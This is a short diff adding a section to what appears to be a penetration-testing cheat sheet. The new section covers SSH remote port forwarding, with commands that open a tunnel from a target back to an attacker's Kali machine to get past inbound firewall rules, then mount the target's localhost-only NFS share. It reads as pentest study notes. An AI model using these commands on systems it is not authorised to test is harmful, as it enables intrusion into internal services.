@@ -29,3 +29,14 @@ Nmap scanning via. Proxychains example
 ```
 $ proxychains nmap -Pn -sT -sV [target]
 ```
+
+### Remote Port Forwarding
+
+SSH remote port forwarding is for opening a connection from within the target -> Kali.
+* Can bypass inbound firewall restrictions to SSH (as outbound connection is used).
+* Can be used to access a target's localhost services from Kali (see NFS below)
+```
+# Mount a target's localhost NFS share
+$ target> ssh -N -R [kali]:2049:127.0.0.1:2049 kali@[kali_ip]
+$ kali> mount -t nfs 127.0.0.1:/ /mnt -o nolock
+```
